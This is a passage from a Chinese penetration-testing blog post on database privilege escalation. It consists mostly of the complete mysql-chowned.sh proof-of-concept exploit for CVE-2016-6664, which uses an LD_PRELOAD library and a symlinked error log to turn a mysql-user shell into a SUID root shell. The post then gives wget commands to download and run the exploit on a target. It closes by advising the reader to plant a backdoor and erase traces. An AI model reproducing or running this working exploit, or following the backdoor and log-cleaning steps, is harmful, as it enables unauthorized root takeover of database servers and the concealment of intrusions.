class="hljs-variable">$1</span><br>&#125;<br><br><span class="hljs-keyword">function</span> ctrl_c() &#123;<br>        echo -e <span class="hljs-string">&quot;\n[+] Active exploitation aborted. Remember you can use -deferred switch for deferred exploitation.&quot;</span><br>    cleanexit <span class="hljs-number">0</span><br>&#125;<br><br><span class="hljs-comment">#intro </span><br>echo -e <span class="hljs-string">&quot;\033[94m \nMySQL / MariaDB / PerconaDB - Root Privilege Escalation PoC Exploit \nmysql-chowned.sh (ver. 1.0)\n\nCVE-2016-6664 / OCVE-2016-5617\n&quot;</span><br>echo -e <span class="hljs-string">&quot;Discovered and coded by: \n\nDawid Golunski \nhttp://legalhackers.com \033[0m&quot;</span><br><br><span class="hljs-comment"># Args</span><br><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$#</span> -lt <span class="hljs-number">1</span> ]; then<br>    echo -e <span class="hljs-string">&quot;\n[!] Exploit usage: \n\n$0 path_to_error.log \n&quot;</span><br>    echo -e <span class="hljs-string">&quot;It seems that this server uses: `ps aux | grep mysql | awk -F&#x27;log-error=&#x27; &#x27;&#123; print $2 &#125;&#x27; | cut -d&#x27; &#x27; -f1 | grep &#x27;/&#x27;`\n&quot;</span><br>    <span class="hljs-keyword">exit</span> <span class="hljs-number">3</span><br>fi<br><br><span class="hljs-comment"># Priv check</span><br><br>echo -e <span class="hljs-string">&quot;\n[+] Starting the exploit as \n\033[94m`id`\033[0m&quot;</span><br>id | grep -q mysql <br><span class="hljs-keyword">if</span> [ $? -ne <span class="hljs-number">0</span> ]; then<br>    echo -e <span class="hljs-string">&quot;\n[!] You need to execute the exploit as mysql user! Exiting.\n&quot;</span><br>    <span class="hljs-keyword">exit</span> <span class="hljs-number">3</span><br>fi<br><br><span class="hljs-comment"># Set target paths</span><br>ERRORLOG=<span class="hljs-string">&quot;$1&quot;</span><br><span class="hljs-keyword">if</span> [ ! -f <span class="hljs-variable">$ERRORLOG</span> ]; then<br>    echo -e <span class="hljs-string">&quot;\n[!] The specified MySQL catalina.out log ($ERRORLOG) doesn&#x27;t exist. Try again.\n&quot;</span><br>    <span class="hljs-keyword">exit</span> <span class="hljs-number">3</span><br>fi<br>echo -e <span class="hljs-string">&quot;\n[+] Target MySQL log file set to $ERRORLOG&quot;</span><br><br><span class="hljs-comment"># [ Active exploitation ]</span><br><br>trap ctrl_c INT<br><span class="hljs-comment"># Compile privesc preload library</span><br>echo -e <span class="hljs-string">&quot;\n[+] Compiling the privesc shared library ($PRIVESCSRC)&quot;</span><br>cat &lt;&lt;_solibeof_&gt;<span class="hljs-variable">$PRIVESCSRC</span><br><span class="hljs-comment">#define _GNU_SOURCE</span><br><span class="hljs-comment">#include &lt;stdio.h&gt;</span><br><span class="hljs-comment">#include &lt;sys/stat.h&gt;</span><br><span class="hljs-comment">#include &lt;unistd.h&gt;</span><br><span class="hljs-comment">#include &lt;dlfcn.h&gt;</span><br>       <span class="hljs-comment">#include &lt;sys/types.h&gt;</span><br>       <span class="hljs-comment">#include &lt;sys/stat.h&gt;</span><br>       <span class="hljs-comment">#include &lt;fcntl.h&gt;</span><br><br>uid_t geteuid(void) &#123;<br>    static uid_t  (*old_geteuid)();<br>    old_geteuid = dlsym(RTLD_NEXT, <span class="hljs-string">&quot;geteuid&quot;</span>);<br>    <span class="hljs-keyword">if</span> ( old_geteuid() == <span class="hljs-number">0</span> ) &#123;<br>        chown(<span class="hljs-string">&quot;$BACKDOORPATH&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>        chmod(<span class="hljs-string">&quot;$BACKDOORPATH&quot;</span>, <span class="hljs-number">04777</span>);<br>        <span class="hljs-regexp">//u</span>nlink(<span class="hljs-string">&quot;/etc/ld.so.preload&quot;</span>);<br>    &#125;<br>    return old_geteuid();<br>&#125;<br>_solibeof_<br><span class="hljs-regexp">/bin/</span>bash -c <span class="hljs-string">&quot;gcc -Wall -fPIC -shared -o $PRIVESCLIB $PRIVESCSRC -ldl&quot;</span><br><span class="hljs-keyword">if</span> [ $? -ne <span class="hljs-number">0</span> ]; then<br>    echo -e <span class="hljs-string">&quot;\n[!] Failed to compile the privesc lib $PRIVESCSRC.&quot;</span><br>    cleanexit <span class="hljs-number">2</span>;<br>fi<br><br><br><span class="hljs-comment"># Prepare backdoor shell</span><br>cp <span class="hljs-variable">$BACKDOORSH</span> <span class="hljs-variable">$BACKDOORPATH</span><br>echo -e <span class="hljs-string">&quot;\n[+] Backdoor/low-priv shell installed at: \n`ls -l $BACKDOORPATH`&quot;</span><br><br><span class="hljs-comment"># Safety check</span><br><span class="hljs-keyword">if</span> [ -f <span class="hljs-regexp">/etc/</span>ld.so.preload ]; then<br>    echo -e <span class="hljs-string">&quot;\n[!] /etc/ld.so.preload already exists. Exiting for safety.&quot;</span><br>    <span class="hljs-keyword">exit</span> <span class="hljs-number">2</span><br>fi<br><br><span class="hljs-comment"># Symlink the log file to /etc</span><br>rm -f <span class="hljs-variable">$ERRORLOG</span> &amp;&amp; ln -s <span class="hljs-regexp">/etc/</span>ld.so.preload <span class="hljs-variable">$ERRORLOG</span><br><span class="hljs-keyword">if</span> [ $? -ne <span class="hljs-number">0</span> ]; then<br>    echo -e <span class="hljs-string">&quot;\n[!] Couldn&#x27;t remove the $ERRORLOG file or create a symlink.&quot;</span><br>    cleanexit <span class="hljs-number">3</span><br>fi<br>echo -e <span class="hljs-string">&quot;\n[+] Symlink created at: \n`ls -l $ERRORLOG`&quot;</span><br><br><span class="hljs-comment"># Wait for MySQL to re-open the logs</span><br>echo -ne <span class="hljs-string">&quot;\n[+] Waiting for MySQL to re-open the logs/MySQL service restart...\n&quot;</span><br>read -p <span class="hljs-string">&quot;Do you want to kill mysqld process to instantly get root? :) ? [y/n] &quot;</span> THE_ANSWER<br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;$THE_ANSWER&quot;</span> = <span class="hljs-string">&quot;y&quot;</span> ]; then<br>    echo -e <span class="hljs-string">&quot;Got it. Executing &#x27;killall mysqld&#x27; now...&quot;</span><br>    killall mysqld<br>fi<br><span class="hljs-keyword">while</span> :; <span class="hljs-keyword">do</span> <br>    sleep <span class="hljs-number">0.1</span><br>    <span class="hljs-keyword">if</span> [ -f <span class="hljs-regexp">/etc/</span>ld.so.preload ]; then<br>        echo <span class="hljs-variable">$PRIVESCLIB</span> &gt; <span class="hljs-regexp">/etc/</span>ld.so.preload<br>        rm -f <span class="hljs-variable">$ERRORLOG</span><br>        <span class="hljs-keyword">break</span>;<br>    fi<br>done<br><br><span class="hljs-comment"># /etc/    dir should be owned by mysql user at this point</span><br><span class="hljs-comment"># Inject the privesc.so shared library to escalate privileges</span><br>echo <span class="hljs-variable">$PRIVESCLIB</span> &gt; <span class="hljs-regexp">/etc/</span>ld.so.preload<br>echo -e <span class="hljs-string">&quot;\n[+] MySQL restarted. The /etc/ld.so.preload file got created with mysql privileges: \n`ls -l /etc/ld.so.preload`&quot;</span><br>echo -e <span class="hljs-string">&quot;\n[+] Adding $PRIVESCLIB shared lib to /etc/ld.so.preload&quot;</span><br>echo -e <span class="hljs-string">&quot;\n[+] The /etc/ld.so.preload file now contains: \n`cat /etc/ld.so.preload`&quot;</span><br>chmod <span class="hljs-number">755</span> <span class="hljs-regexp">/etc/</span>ld.so.preload<br><br><span class="hljs-comment"># Escalating privileges via the SUID binary (e.g. /usr/bin/sudo)</span><br>echo -e <span class="hljs-string">&quot;\n[+] Escalating privileges via the $SUIDBIN SUID binary to get root!&quot;</span><br>sudo <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span>null &gt;<span class="hljs-regexp">/dev/</span>null<br><br><span class="hljs-comment">#while :; do </span><br><span class="hljs-comment">#    sleep 0.1</span><br><span class="hljs-comment">#    ps aux | grep mysqld | grep -q &#x27;log-error&#x27;</span><br><span class="hljs-comment">#    if [ $? -eq 0 ]; then</span><br><span class="hljs-comment">#        break;</span><br><span class="hljs-comment">#    fi</span><br><span class="hljs-comment">#done</span><br><br><span class="hljs-comment"># Check for the rootshell</span><br>ls -l <span class="hljs-variable">$BACKDOORPATH</span><br>ls -l <span class="hljs-variable">$BACKDOORPATH</span> | grep rws | grep -q root<br><span class="hljs-keyword">if</span> [ $? -eq <span class="hljs-number">0</span> ]; then <br>    echo -e <span class="hljs-string">&quot;\n[+] Rootshell got assigned root SUID perms at: \n`ls -l $BACKDOORPATH`&quot;</span><br>    echo -e <span class="hljs-string">&quot;\n\033[94mGot root! The database server has been ch-OWNED !\033[0m&quot;</span><br><span class="hljs-keyword">else</span><br>    echo -e <span class="hljs-string">&quot;\n[!] Failed to get root&quot;</span><br>    cleanexit <span class="hljs-number">2</span><br>fi<br><br><br><span class="hljs-comment"># Execute the rootshell</span><br>echo -e <span class="hljs-string">&quot;\n[+] Spawning the rootshell $BACKDOORPATH now! \n&quot;</span><br><span class="hljs-variable">$BACKDOORPATH</span> -p -c <span class="hljs-string">&quot;rm -f /etc/ld.so.preload; rm -f $PRIVESCLIB&quot;</span><br><span class="hljs-variable">$BACKDOORPATH</span> -p<br><br><span class="hljs-comment"># Job done.</span><br>cleanexit <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>
+
+<p>然后我们在刚才mysql权限的shell中下载提权脚本并执行</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget http:<span class="hljs-regexp">//</span>legalhackers.com<span class="hljs-regexp">/exploits/</span>CVE-<span class="hljs-number">2016</span>-<span class="hljs-number">6664</span>/mysql-chowned.sh<br>chmod <span class="hljs-number">777</span> mysql-chowned.sh<br>.<span class="hljs-regexp">/mysql-chowned.sh /</span>var<span class="hljs-regexp">/log/my</span>sql/error.log<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/echohun/blog_image/blob/master/mysql_priv/mysql_priv13.png?raw=true" srcset="/img/loading.gif" lazyload></p>
+<p>成功得到root权限</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/mysql_priv/mysql_priv14.png?raw=true" srcset="/img/loading.gif" lazyload></p>
+<p>接下来利用root账户留后门，清理痕迹即可。</p>
+<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>数据库提权是后渗透阶段非常常用的提权方式，做渗透测试时，数据库是重要的突破点，只有我们对这些漏洞有一定的积累，才能面对不同的情况利用不同的漏洞。</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E6%8F%90%E6%9D%83/">提权</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2018/07/05/Docker%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Docker使用笔记</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2018/06/28/IIS%E7%9F%AD%E6%96%87%E4%BB%B6%E5%90%8D%E6%BC%8F%E6%B4%9E/">
+                        <span class="hidden-mobile">IIS短文件名漏洞</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.2/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      $('#local-search-input').on('click', function() {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      });
+      $('#modalSearch').on('shown.bs.modal', function() {
+        $('#local-search-input').focus();
+      });
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
